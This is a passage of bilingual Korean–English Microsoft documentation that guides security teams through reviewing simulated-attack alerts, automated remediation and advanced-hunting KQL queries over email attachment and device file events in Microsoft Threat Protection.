<span data-ttu-id="20556-212">![IP 주소 정보 페이지 스크린샷](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="20556-212">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>


<span data-ttu-id="20556-213">**알림: 사용자 및 SMB (IP 주소 검사) (원본: Azure ATP)**</span><span class="sxs-lookup"><span data-stu-id="20556-213">**Alert: User and IP address reconnaissance (SMB) (Source: Azure ATP)**</span></span>

<span data-ttu-id="20556-214">서버 메시지 블록 (SMB) 프로토콜을 사용한 열거 공격자가 네트워크를 통해 laterally를 이동 하 여 특정 중요 한 계정에 액세스 하는 데 도움이 되는 최근 사용자 로그온 정보를 가져올 수 있도록 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-214">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="20556-215">이 검색에서는 SMB 세션 열거가 도메인 컨트롤러에 대해 실행 되는 경우 경고가 트리거됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-215">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![사용자 및 IP 주소 정찰에 대 한 Azure ATP 경고 스크린샷](../../media/mtp/fig10.png) 


### <a name="review-the-device-timeline-microsoft-defender-atp"></a><span data-ttu-id="20556-217">장치 시간 표시 막대 검토 [Microsoft Defender ATP]</span><span class="sxs-lookup"><span data-stu-id="20556-217">Review the device timeline [Microsoft Defender ATP]</span></span>
<span data-ttu-id="20556-218">이 인시던트의 다양 한 경고를 살펴본 후 앞에서 조사 했던 인시던트 페이지로 다시 이동 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-218">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="20556-219">인시던트 페이지에서 **장치** 탭을 클릭 하 여이 인시던트에 포함 된 장치를 MICROSOFT Defender Atp 및 Azure ATP에서 보고 한 대로 검토 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-219">Click the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender ATP and Azure ATP.</span></span>

<span data-ttu-id="20556-220">공격이 수행 된 장치의 이름을 클릭 하 여 해당 장치에 대 한 엔터티 페이지를 엽니다.</span><span class="sxs-lookup"><span data-stu-id="20556-220">Click the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="20556-221">이 페이지에서 트리거된 경고 및 관련 이벤트를 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-221">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="20556-222">**시간 표시 막대** 탭을 클릭 하 여 장치 시간 표시 막대를 열고, 경고가 발생 한 시간 순서에 따라 장치에서 관찰 된 모든 이벤트 및 동작을 확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-222">Click the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![동작이 포함 된 장치 시간 표시 막대 스크린샷](../../media/mtp/fig11.png) 

<span data-ttu-id="20556-224">보다 흥미로운 동작 중 일부를 확장 하면 프로세스 트리와 같은 유용한 정보를 얻을 수도 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-224">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="20556-225">예를 들어 **의심 스러운 프로세스 주입이 관찰**될 때까지 아래로 스크롤합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-225">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="20556-226">왼쪽 창에 있는 **이벤트 엔터티** 그래프에이 동작에 대 한 전체 프로세스 트리를 표시 하려면 **notepad.exe Process 이벤트에 삽입powershell.exe** 을 클릭 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-226">Click the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="20556-227">필요한 경우 검색 창을 사용 하 여 필터링 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-227">Use the search bar for filtering if necessary.</span></span>

![선택한 PowerShell 파일 만들기 동작에 대 한 프로세스 트리 스크린샷](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="20556-229">사용자 정보 검토 [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="20556-229">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="20556-230">인시던트 페이지에서 **사용자** 탭을 클릭 하 여 공격에 관련 된 사용자 목록을 표시 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-230">On the incident page, click the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="20556-231">이 표에서는 각 사용자의 **조사 우선 순위** 점수를 포함 하 여 각 사용자에 대 한 추가 정보를 포함 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-231">The table contains additional information about each user, including each user’s **Investigation Priority** score.</span></span>

<span data-ttu-id="20556-232">사용자 이름을 클릭 하 여 추가 조사가 수행 될 수 있는 user profile 페이지를 엽니다.</span><span class="sxs-lookup"><span data-stu-id="20556-232">Click the username to open the user’s profile page where further investigation can be conducted.</span></span> <span data-ttu-id="20556-233">[위험한 사용자 조사에 대 한 자세한 내용을 읽으십시오](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span><span class="sxs-lookup"><span data-stu-id="20556-233">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>
<br>
<span data-ttu-id="20556-234">![Cloud App Security 사용자 페이지 스크린샷](../../media/mtp/fig13.png)</span><span class="sxs-lookup"><span data-stu-id="20556-234">![Screenshot of Cloud App Security user page](../../media/mtp/fig13.png)</span></span>


## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="20556-235">자동화된 조사 및 수정</span><span class="sxs-lookup"><span data-stu-id="20556-235">Automated investigation and remediation</span></span>
>[!NOTE]
><span data-ttu-id="20556-236">이 시뮬레이션을 안내 하기 전에 다음 비디오를 시청 하 여 자동화 된 자체 치유가 어떻게 제공 되는지, 포털에서 찾을 수 있는 위치, 그리고 보안 작업에 도움이 되는 방식에 대해 알아봅니다.</span><span class="sxs-lookup"><span data-stu-id="20556-236">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="20556-237">Microsoft 365 보안 센터 포털의 인시던트로 다시 이동 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-237">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="20556-238">**인시던트** 페이지의 **조사** 탭에는 Azure ATP 및 Microsoft Defender atp가 트리거한 자동화 된 조사가 표시 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-238">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Azure ATP and Microsoft Defender ATP.</span></span> <span data-ttu-id="20556-239">아래 스크린샷에서는 Microsoft Defender ATP에서 트리거한 자동화 된 조사만 표시 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-239">The screenshot below displays only the automated investigation triggered by Microsoft Defender ATP.</span></span> <span data-ttu-id="20556-240">기본적으로 Microsoft Defender ATP은 업데이트를 필요로 하는 큐에 있는 아티팩트를 자동으로 remediates.</span><span class="sxs-lookup"><span data-stu-id="20556-240">By default, Microsoft Defender ATP automatically remediates the artifacts found in the queue which requires remediation.</span></span>

![문제와 관련 된 자동화 된 조사 스크린샷](../../media/mtp/fig14.png)

<span data-ttu-id="20556-242">조사를 트리거한 경고를 클릭 하 여 **조사 정보** 페이지를 엽니다.</span><span class="sxs-lookup"><span data-stu-id="20556-242">Click the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="20556-243">다음이 표시 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-243">You’ll see the following:</span></span>
- <span data-ttu-id="20556-244">자동 조사를 트리거한 경고입니다.</span><span class="sxs-lookup"><span data-stu-id="20556-244">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="20556-245">영향을 받는 사용자 및 장치</span><span class="sxs-lookup"><span data-stu-id="20556-245">Impacted users and devices.</span></span> <span data-ttu-id="20556-246">추가 디바이스에서 표시기가 발견 되 면 추가 장치도 나열 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-246">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="20556-247">증거의 목록입니다.</span><span class="sxs-lookup"><span data-stu-id="20556-247">List of evidence.</span></span> <span data-ttu-id="20556-248">파일, 프로세스, 서비스, 드라이버 및 네트워크 주소와 같은 검색 및 분석 된 엔터티입니다.</span><span class="sxs-lookup"><span data-stu-id="20556-248">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="20556-249">이러한 엔터티는 경고에 대 한 가능한 관계를 분석 하 고 양성 또는 악의적으로 등급이 지정 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-249">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="20556-250">위협이 발견 되었습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-250">Threats found.</span></span> <span data-ttu-id="20556-251">조사 중에 발견 된 알려진 위협</span><span class="sxs-lookup"><span data-stu-id="20556-251">Known threats that are found during the investigation.</span></span>

>[!NOTE]
><span data-ttu-id="20556-252">타이밍에 따라 자동화 조사가 계속 실행 되 고 있을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-252">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="20556-253">증거를 수집 및 분석 하 고 결과를 검토 하기 전에 프로세스가 완료 될 때까지 몇 분 정도 기다립니다.</span><span class="sxs-lookup"><span data-stu-id="20556-253">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="20556-254">**조사 세부 정보** 페이지를 새로 고쳐 최신 결과를 가져옵니다.</span><span class="sxs-lookup"><span data-stu-id="20556-254">Refresh the **Investigation details** page to get the latest findings.</span></span>

![조사 정보 페이지 스크린샷](../../media/mtp/fig15.png)

<span data-ttu-id="20556-256">자동 조사 중에 Microsoft Defender ATP가 notepad.exe 프로세스를 확인 했으며, 수정이 필요한 아티팩트 중 하나로 삽입 되었습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-256">During the automated investigation, Microsoft Defender ATP identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="20556-257">Microsoft Defender ATP는 자동화 된 재구성의 일부로 의심 스러운 프로세스 주입을 자동으로 중지 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-257">Microsoft Defender ATP automatically stops the suspicious process injection as part of the automated remediation.</span></span> 

<span data-ttu-id="20556-258">테스트 장치에서 실행 중인 프로세스 목록에 <i>notepad.exe</i> 사라지게 되는 것을 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-258">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="20556-259">문제 해결</span><span class="sxs-lookup"><span data-stu-id="20556-259">Resolve the incident</span></span>

<span data-ttu-id="20556-260">조사가 완료 되 고 재구성 된 것으로 확인 되 면 인시던트를 닫습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-260">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="20556-261">**인시던트 관리**를 클릭 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-261">Click **Manage incident**.</span></span> <span data-ttu-id="20556-262">**인시던트를 해결** 하려면 상태를 설정 하 고 관련 분류를 선택 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-262">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="20556-263">인시던트가 해결 되 면 Microsoft 365 보안 센터 및 관련 포털의 관련 경고를 모두 닫습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-263">Once the incident is resolved, it will close all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![문제를 해결 하기 위해 전환을 클릭할 수 있는 인시던트 관리 패널이 열려 있는 문제 페이지 스크린샷](../../media/mtp/fig16.png) 

<br>
<span data-ttu-id="20556-265">이렇게 하면 문제 관리 및 자동화 된 조사 및 업데이트 시나리오에 대 한 공격 시뮬레이션이 발생 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-265">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="20556-266">다음 시뮬레이션에서는 악성 파일에 대 한 사전 위협 구하기를 안내 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-266">The next simulation will take you through proactive threat hunting for potentially-malicious files.</span></span> 

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="20556-267">고급 구하기 시나리오</span><span class="sxs-lookup"><span data-stu-id="20556-267">Advanced hunting scenario</span></span>

>[!NOTE]
><span data-ttu-id="20556-268">시뮬레이션을 안내 하기 전에 다음 비디오를 시청 하 여 고급 구하기 개념을 이해 하 고, 포털에서 찾을 수 있는 위치를 확인 하 고, 보안 작업에 도움이 되는 방법을 알아봅니다.</span><span class="sxs-lookup"><span data-stu-id="20556-268">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="20556-269">구하기 환경 요구 사항</span><span class="sxs-lookup"><span data-stu-id="20556-269">Hunting environment requirements</span></span>
<span data-ttu-id="20556-270">이 시나리오에는 단일 내부 사서함 및 장치가 필요 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-270">There is a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="20556-271">또한 테스트 메시지를 보내려면 외부 전자 메일 계정도 필요 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-271">You will also need an external email account to send the test message.</span></span>

1.  <span data-ttu-id="20556-272">테 넌 트에서 [Microsoft Threat Protection을 사용 하도록 설정](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)했는지 확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-272">Verify that your tenant has [enabled Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2.  <span data-ttu-id="20556-273">전자 메일을 받는 데 사용할 대상 사서함을 식별 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-273">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="20556-274">a.</span><span class="sxs-lookup"><span data-stu-id="20556-274">a.</span></span>  <span data-ttu-id="20556-275">이 사서함은 Office 365 ATP b가 모니터링 해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-275">This mailbox must be monitored by Office 365 ATP b.</span></span>  <span data-ttu-id="20556-276">요구 사항 3에서이 사서함에 액세스 해야 하는 장치</span><span class="sxs-lookup"><span data-stu-id="20556-276">The device from requirement 3 needs to access this mailbox</span></span>
3.  <span data-ttu-id="20556-277">테스트 장치 구성: a를 실행 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-277">Configure a test device: a.</span></span>  <span data-ttu-id="20556-278">Windows 10 버전 1903 이상 버전을 사용 하 고 있는지 확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-278">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="20556-279">b.</span><span class="sxs-lookup"><span data-stu-id="20556-279">b.</span></span>  <span data-ttu-id="20556-280">테스트 장치를 테스트 도메인에 연결 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-280">Join the test device to the test domain.</span></span>
    <span data-ttu-id="20556-281">c.</span><span class="sxs-lookup"><span data-stu-id="20556-281">c.</span></span>  <span data-ttu-id="20556-282">[Windows Defender 바이러스 백신을 사용 하도록 설정](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-282">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="20556-283">Windows Defender 바이러스 백신을 사용 하도록 설정 하는 데 문제가 있는 경우 [이 문제 해결 항목](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)을 참조 하세요.</span><span class="sxs-lookup"><span data-stu-id="20556-283">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="20556-284">d.</span><span class="sxs-lookup"><span data-stu-id="20556-284">d.</span></span>  <span data-ttu-id="20556-285">[Microsoft Defender Advanced Threat Protection (MDATP)에 내장](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)되어 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-285">[Onboard to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="20556-286">시뮬레이션 실행</span><span class="sxs-lookup"><span data-stu-id="20556-286">Run the simulation</span></span>
1.  <span data-ttu-id="20556-287">외부 전자 메일 계정에서 테스트 환경 요구 사항 섹션의 2 단계에서 식별 된 사서함으로 전자 메일을 보냅니다.</span><span class="sxs-lookup"><span data-stu-id="20556-287">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="20556-288">기존 전자 메일 필터 정책을 통해 허용 되는 첨부 파일을 포함 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-288">Include an attachment that will be allowed through any existing email filter policies.</span></span>  <span data-ttu-id="20556-289">이 파일은 악의적이 든 실행 파일이 될 필요는 없습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-289">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="20556-290">권장 되는 파일 형식은 <i>.pdf</i>, <i>.exe</i> (허용 되는 경우) 또는 Office 문서 (예: Word 파일)입니다.</span><span class="sxs-lookup"><span data-stu-id="20556-290">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2.  <span data-ttu-id="20556-291">테스트 환경 요구 사항 섹션의 3 단계에서 정의 된 대로 구성 된 장치에서 보낸 전자 메일을 엽니다.</span><span class="sxs-lookup"><span data-stu-id="20556-291">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="20556-292">첨부 파일을 열거나 장치에 저장 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-292">Either open the attachment or save the file to the device.</span></span>


<span data-ttu-id="20556-293">**이동 검색**</span><span class="sxs-lookup"><span data-stu-id="20556-293">**Go hunting**</span></span>
1.  <span data-ttu-id="20556-294">Security.microsoft.com 포털을 엽니다.</span><span class="sxs-lookup"><span data-stu-id="20556-294">Open the security.microsoft.com portal.</span></span>
2.  <span data-ttu-id="20556-295">**사냥 > 고급 구하기**로 이동 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-295">Navigate to **Hunting > Advanced hunting**.</span></span>

    ![M365 보안 센터 포털 탐색 모음의 고급 구하기 스크린샷](../../media/mtp/fig17.png) 

3.  <span data-ttu-id="20556-297">전자 메일 이벤트를 수집 하 여 시작 되는 쿼리를 작성 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-297">Build a query that starts by gathering email events.</span></span>
    <span data-ttu-id="20556-298">a.</span><span class="sxs-lookup"><span data-stu-id="20556-298">a.</span></span>  <span data-ttu-id="20556-299">쿼리 창에서 새로 만들기를 선택 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-299">From the query pane, select New.</span></span>
    <span data-ttu-id="20556-300">b.</span><span class="sxs-lookup"><span data-stu-id="20556-300">b.</span></span>  <span data-ttu-id="20556-301">스키마에서 EmailEvents 테이블을 두 번 클릭 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-301">Double-click on the EmailEvents table from the schema.</span></span>

```
EmailEvents 
```                                        

   <span data-ttu-id="20556-302">c.</span><span class="sxs-lookup"><span data-stu-id="20556-302">c.</span></span>   <span data-ttu-id="20556-303">시간 프레임을 지난 24 시간으로 변경 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-303">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="20556-304">위에서 시뮬레이션을 실행 했을 때 보낸 전자 메일이 지난 24 시간 이내에 있는 것으로 가정 하 고 그렇지 않으면 시간 프레임을 변경 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-304">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>
   <span data-ttu-id="20556-305">![시간 프레임을 변경할 수 있는 위치에 대 한 스크린샷</span><span class="sxs-lookup"><span data-stu-id="20556-305">![Screenshot of where you can change the time frame.</span></span> <span data-ttu-id="20556-306">시간 범위에서 선택 하려면 드롭다운 메뉴를 엽니다.](../../media/mtp/fig18.png)</span><span class="sxs-lookup"><span data-stu-id="20556-306">Open the drop-down menu to choose from range of time frame options](../../media/mtp/fig18.png)</span></span> 


   <span data-ttu-id="20556-307">d.</span><span class="sxs-lookup"><span data-stu-id="20556-307">d.</span></span>   <span data-ttu-id="20556-308">쿼리를 실행 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-308">Run the query.</span></span>  <span data-ttu-id="20556-309">파일럿 환경에 따라 결과가 여러 개 있을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-309">You may have many results depending on the environment for the pilot.</span></span>  

>[!NOTE]
><span data-ttu-id="20556-310">데이터 반환을 제한 하는 필터링 옵션은 다음 단계를 참조 하십시오.</span><span class="sxs-lookup"><span data-stu-id="20556-310">See the next step for filtering options to limit data return.</span></span>

   ![고급 구하기 쿼리 결과 스크린샷](../../media/mtp/fig19.png) 

>[!NOTE]
><span data-ttu-id="20556-312">고급 구하기 쿼리 결과를 테이블 형식 데이터로 표시 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="20556-313">차트와 같은 다른 형식 유형의 데이터를 볼 수도 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-313">You can also opt to view the data in other format types such as charts.</span></span>    

   <span data-ttu-id="20556-314">e.</span><span class="sxs-lookup"><span data-stu-id="20556-314">e.</span></span>   <span data-ttu-id="20556-315">결과를 확인 하 고 열었던 전자 메일을 식별할 수 있는지 확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-315">Look at the results and see if you can identify the email you opened.</span></span>  <span data-ttu-id="20556-316">메시지가 고급 구하기에 표시 되는 데 최대 2 시간이 걸릴 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-316">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="20556-317">전자 메일 환경이 크고 결과가 많은 경우에는 **필터 표시 옵션** 을 사용 하 여 메시지를 찾을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-317">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span> 

   <span data-ttu-id="20556-318">이 예제에서는 전자 메일이 Yahoo 계정에서 전송 되었습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-318">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="20556-319">**+** SenderFromDomain 섹션 아래의 **yahoo.com** 옆에 있는 아이콘을 클릭 한 다음 **적용** 을 클릭 하 여 선택한 도메인을 쿼리에 추가 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-319">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span>  <span data-ttu-id="20556-320">시뮬레이션을 실행 하 여 결과를 필터링 하는 1 단계에서 테스트 메시지를 보내는 데 사용 된 도메인 또는 전자 메일 계정을 사용 해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-320">You should use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span>  <span data-ttu-id="20556-321">쿼리를 다시 실행 하 여 더 작은 결과 집합을 가져와 시뮬레이션에서 메시지가 표시 되는지 확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-321">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>
   
   ![필터의 스크린샷](../../media/mtp/fig20.png) 


```
EmailEvents 
| where SenderMailFromDomain == "yahoo.com"
```

   <span data-ttu-id="20556-324">f.</span><span class="sxs-lookup"><span data-stu-id="20556-324">f.</span></span>   <span data-ttu-id="20556-325">쿼리 결과 행을 클릭 하 여 레코드를 검사할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-325">Click the resulting rows from the query so you can inspect the record.</span></span>
   <span data-ttu-id="20556-326">![고급 검색 결과를 선택한 경우 열리는 녹음/녹화 옆 패널 검사 스크린샷](../../media/mtp/fig21.png)</span><span class="sxs-lookup"><span data-stu-id="20556-326">![Screenshot of the inspect record side panel which opens up when an advanced hunting result is selected](../../media/mtp/fig21.png)</span></span> 


4.  <span data-ttu-id="20556-327">전자 메일을 볼 수 있음을 확인 했으므로 이제 첨부 파일에 대 한 필터를 추가 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-327">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="20556-328">환경에 첨부 파일이 있는 모든 전자 메일에 포커스를 맞춥니다.</span><span class="sxs-lookup"><span data-stu-id="20556-328">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="20556-329">이 시나리오에서는 사용자 환경에서 전송 되는 것이 아니라 인바운드 전자 메일에 집중 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-329">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="20556-330">추가한 필터를 제거 하 여 메시지를 찾고 "| 여기에서 **AttachmentCount > 0** 및 **emaildirection**  ==  **"인바운드" "**</span><span class="sxs-lookup"><span data-stu-id="20556-330">Remove any filters you have added to locate your message and add “| where **AttachmentCount > 0** and **EmailDirection** == **“Inbound””**</span></span>

<span data-ttu-id="20556-331">다음 쿼리는 모든 전자 메일 이벤트에 대 한 초기 쿼리 보다 더 짧은 목록의 결과를 보여 줍니다.</span><span class="sxs-lookup"><span data-stu-id="20556-331">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"

```

5.  <span data-ttu-id="20556-332">다음으로, 첨부 파일에 대 한 정보 (예: 이름, 해시)를 결과 집합에 포함 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-332">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="20556-333">이렇게 하려면 **EmailAttachmentInfo** 테이블을 조인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-333">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="20556-334">조인에 사용 하는 일반 필드는 **Networkmessageid** 및 **RecipientObjectId**입니다.</span><span class="sxs-lookup"><span data-stu-id="20556-334">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

<span data-ttu-id="20556-335">다음 쿼리에는 추가 줄 "|"도 포함 되어 있습니다. **project-Rename EmailTimestamp = Timestamp**"다음 단계에서 추가할 파일 작업과 관련 된 해당 전자 메일 및 타임 스탬프와 관련 된 타임 스탬프를 식별 하는 데 도움이 되는 정보입니다.</span><span class="sxs-lookup"><span data-stu-id="20556-335">The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp**” that will help identify which timestamp was related to the email versus timestamps related to file actions which you will add in the next step.</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
```

6.  <span data-ttu-id="20556-336">다음으로, **EmailAttachmentInfo** 테이블의 **SHA256** 값을 사용 하 여 해당 해시에 대 한 **devicefileevents** (끝점에서 발생 한 파일 작업)를 찾습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-336">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span>  <span data-ttu-id="20556-337">여기에는 일반 필드가 첨부 파일의 SHA256 해시가 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-337">The common field here will be the SHA256 hash for the attachment.</span></span>

<span data-ttu-id="20556-338">결과 테이블에는 이제 끝점 (Microsoft Defender ATP), 장치 이름, 수행 된 작업 (이 경우에는 FileCreated 이벤트만 포함 하도록 필터링 됨), 그리고 파일을 저장 한 위치 등의 세부 정보가 포함 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-338">The resulting table now includes details from the endpoint (Microsoft Defender ATP) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="20556-339">프로세스와 연결 된 계정 이름도 포함 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-339">The account name associated with the process will also be included.</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
```

